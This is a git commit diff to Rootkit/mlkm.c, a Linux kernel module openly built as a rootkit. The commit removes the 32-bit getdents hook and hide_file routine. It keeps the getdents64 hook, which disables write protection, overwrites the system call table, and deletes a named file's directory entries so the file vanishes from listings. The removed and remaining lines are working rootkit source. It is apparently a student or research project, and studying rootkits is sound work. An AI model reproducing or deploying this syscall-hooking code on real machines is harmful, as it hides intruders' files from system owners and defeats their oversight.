49c16641c0f1ae702acc9166f9fcd7420d1842b5
Xincheng Yang <xyang76@hawk.iit.edu>
2017-03-09 03:20:29 -0600

    update

--- Rootkit/mlkm.c
+++ Rootkit/mlkm.c
@@ -14,13 +14,10 @@ MODULE_DESCRIPTION("Rootkit main entry");
 /*************** Methods declaration ********************/
 // Hook system call table and hide file by name
 static unsigned long **hook_syscall_table(void);
-static long hide_file(char *f_name, struct linux_dirent *dirp, long count);
 static long hide_file64(char *f_name, struct linux_dirent64 *dirp, long count);
 // Kernel system call
-asmlinkage long (*kernel_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
 asmlinkage long (*kernel_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
 // Faked system call
-asmlinkage long fake_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
 asmlinkage long fake_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
 
 /*************** What file we gonna hide ********************/
@@ -45,9 +42,7 @@ static int lkm_init(void)
     syscall_table = hook_syscall_table();
     
     DISABLE_WRITE_PROTECTION;
-    kernel_getdents = (void *)syscall_table[__NR_getdents]; 
     kernel_getdents64 = (void *)syscall_table[__NR_getdents64]; 
-    syscall_table[__NR_getdents] = (unsigned long *)fake_getdents;
     syscall_table[__NR_getdents64] = (unsigned long *)fake_getdents64;
     ENABLE_WRITE_PROTECTION;
     
@@ -70,39 +65,6 @@ unsigned long ** hook_syscall_table(void)
     }
 
     return NULL;
-}
-
-
-/**
- * @brief Hide a specified file use linux_dirent
- * @param f_name : the file we want to hide 
- * @param dirp : the structure dirent which point to a specified file(inode) 
- * @param count : the size of this structure
- * @param bit : identify the bit size for OS
- * @return 
- */
-static long hide_file(char *f_name, struct linux_dirent *dirp, long count)
-{
-    struct linux_dirent *dp;
-    long cur_addr, cur_reclen;
-    unsigned long size, next_addr;
-
-    for (cur_addr = 0; cur_addr < count; cur_addr += dp->d_reclen) {
-        dp = (struct linux_dirent *)((unsigned long)dirp + cur_addr);
-        
-        if (strncmp(dp->d_name, f_name, strlen(f_name)) == 0) {
-            cur_reclen = dp->d_reclen;                              // Store the current length
-            next_addr = (unsigned long)dp + dp->d_reclen;           // Next address = current+len
-            size = (unsigned long)dirp + count - next_addr;        // Remain size = initial+size-next size
-            
-            memmove(dp, (void *)next_addr, size);                 // current dirent point to the next
-            count -= cur_reclen;                                     // Modify the size
-            
-            printk("Hide %s success.\n", dp->d_name);
-        }
-    }
-
-    return count;
 }
 
 /**
@@ -134,16 +96,6 @@ static long hide_file64(char *f_name, struct linux_dirent64 *dirp, long count)
     }
 
     return count;
-}
-
-asmlinkage long fake_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
-{
-    long rv;
-    
-    rv = kernel_getdents(fd, dirp, count);
-    rv = hide_file(targetfile, dirp, count);
-    
-    return rv;
 }
 
 asmlinkage long fake_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
